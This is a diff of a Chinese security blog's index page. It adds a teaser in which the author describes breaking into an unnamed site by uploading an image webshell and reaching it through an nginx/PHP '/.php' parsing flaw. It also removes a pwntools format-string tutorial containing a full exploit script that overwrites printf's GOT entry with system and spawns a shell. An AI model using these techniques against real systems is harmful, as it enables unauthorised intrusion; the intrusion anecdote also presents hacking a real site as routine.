@@ -221,6 +221,69 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-2018-2-21" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/02/20/2018-2-21/" class="article-date">
+      <time datetime="2018-02-21T07:20:42.000Z" itemprop="datePublished">2018-02-20</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/02/20/2018-2-21/">低版本php+nginx 解析漏洞</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是<code>1.6.2</code>，php版本是<code>5.3.3</code>，开了<code>GPC</code>，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个<code>/.php</code>访问，它。。竟然执行了！？<br><img src="/2018/02/20/2018-2-21/5.png" alt="5.png" title=""></p>
+          
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+    </div>
+
+      
+        <p class="article-more-link">
+          <a  href="/2018/02/20/2018-2-21/#more">阅读全文 >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-cve-2017-office" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -823,78 +886,6 @@
 
 
   
-    <article id="post-初探pwntools-fmt特性" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2017/04/09/初探pwntools-fmt特性/" class="article-date">
-      <time datetime="2017-04-09T15:16:41.000Z" itemprop="datePublished">2017-04-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/04/09/初探pwntools-fmt特性/">【pwn】 初探pwntools fmt特性</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。</p>
-<p>官方文档链接  <a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="external">http://pwntools.readthedocs.io/en/stable/fmtstr.html</a></p>
-<p>在本地一看，pwntools还是2.x版本。。官方都已经更新到3.5版本了，于是果断更新= =。。</p>
-<p>漏洞程序是这样子的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+1Ch] [bp-184h]@2</span></div><div class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+9Ch] [bp-104h]@2</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [sp+11Ch] [bp-84h]@2</span></div><div class="line">  <span class="keyword">int</span> v6; <span class="comment">// [sp+19Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  v6 = *MK_FP(__GS__, <span class="number">20</span>);</div><div class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  print_welcome();</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"First input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v3);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Second input:"</span>);</div><div class="line">    get_input(<span class="number">256</span>, &amp;v4);</div><div class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;v5, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v3);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">44</span>);</div><div class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v4);</div><div class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"All is Done"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>可以直接看到，有两处fmt漏洞，这是个循环，我们只需要循环利用其中一个fmt漏洞就可以。</p>
-<p>我们可以利用pwntools提供fmt自动利用的功能快速算出格式化字符串在栈中的偏移。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p = process(target)</div><div class="line">	p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	<span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div></pre></td></tr></table></figure>
-<p>泄露出其中一个库函数地址后，利用我们本地搭建好的libc-database库算出system函数的地址。(如果出现多个匹配的话，就爆破吧:P</p>
-<p>主要的还是它可以自动完成任意地址写的payload，就适合我这种深度懒癌患者</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">	ru(<span class="string">"input:"</span>)</div><div class="line">	sl(payload)</div><div class="line">	ru(<span class="string">"input:"</span>)</div><div class="line">	sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line">autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">autofmt.write(printf_got,system_addr)</div><div class="line">autofmt.execute_writes()</div></pre></td></tr></table></figure>
-<p>总的exp是这样子的。大概爆破三次就出结果，这还是我只泄露了一个库函数地址的情况下。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-08 21:08:57</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./echo"</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">bss = rop.section(<span class="string">'.bss'</span>)+<span class="number">0x30</span></div><div class="line">printf_got = rop.got(<span class="string">'printf'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x80486C1\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p = process(target)</div><div class="line">	p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	<span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">	ru(<span class="string">"input:"</span>)</div><div class="line">	sl(payload)</div><div class="line">	ru(<span class="string">"input:"</span>)</div><div class="line">	sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 get system_addr</span></div><div class="line"></div><div class="line">offset_system = [<span class="number">-63744</span>, <span class="number">-78400</span>, <span class="number">-55008</span>, <span class="number">-57072</span>, <span class="number">-55136</span>, <span class="number">-61392</span>, <span class="number">-55120</span>, <span class="number">-59840</span>, <span class="number">-64784</span>, <span class="number">-59456</span>, <span class="number">-58400</span>, <span class="number">-58480</span>, <span class="number">-60464</span>, <span class="number">-76112</span>, <span class="number">3792</span>, <span class="number">-70432</span>, <span class="number">-58160</span>, <span class="number">-1063904</span>, <span class="number">-1042576</span>, <span class="number">-1041936</span>, <span class="number">-68192</span>, <span class="number">-77448</span>, <span class="number">-51488</span>, <span class="number">-71904</span>]</div><div class="line"><span class="keyword">for</span> o <span class="keyword">in</span> offset_system:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		p = process(target)</div><div class="line">		printf_got = rop.got(<span class="string">"printf"</span>)</div><div class="line">		puts_got = rop.got(<span class="string">"puts"</span>)</div><div class="line"></div><div class="line">		ru(<span class="string">"input:"</span>)</div><div class="line">		sl(p32(printf_got)+<span class="string">"%7$s"</span>)</div><div class="line">		ru(<span class="string">"input:"</span>)</div><div class="line">		sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">		printf_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line">		ru(<span class="string">"input:"</span>)</div><div class="line">		sl(p32(puts_got)+<span class="string">"%7$s"</span>)</div><div class="line">		ru(<span class="string">"input:"</span>)</div><div class="line">		sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">		puts_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line">		<span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line">		<span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line"></div><div class="line">		system_addr = printf_addr+o</div><div class="line"></div><div class="line">		<span class="comment"># stage 3 change printf_addr to system_addr</span></div><div class="line">		autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">		autofmt.write(printf_got,system_addr)</div><div class="line">		autofmt.execute_writes()</div><div class="line">		<span class="comment"># print offset</span></div><div class="line">		<span class="comment"># print "bss_addr="+hex(bss)</span></div><div class="line">		<span class="comment"># payload = fmtstr_payload(1,&#123;bss:0xdeadbeaf&#125;,1,"byte")</span></div><div class="line">		<span class="comment"># print payload</span></div><div class="line"></div><div class="line">		p.interactive()</div><div class="line">	<span class="keyword">except</span>:</div><div class="line">		<span class="keyword">continue</span></div></pre></td></tr></table></figure>
-<p>后记：啥时候出个FSP自动利用的啊。。</p>
-
-      
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fmt/">fmt</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwntools/">pwntools</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -905,7 +896,7 @@
     <div class="outer">
         <div id="footer-info">
             <div class="footer-left">
-                &copy; 2017 WinterSun
+                &copy; 2018 WinterSun
             </div>
             <div class="footer-right">
                 <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
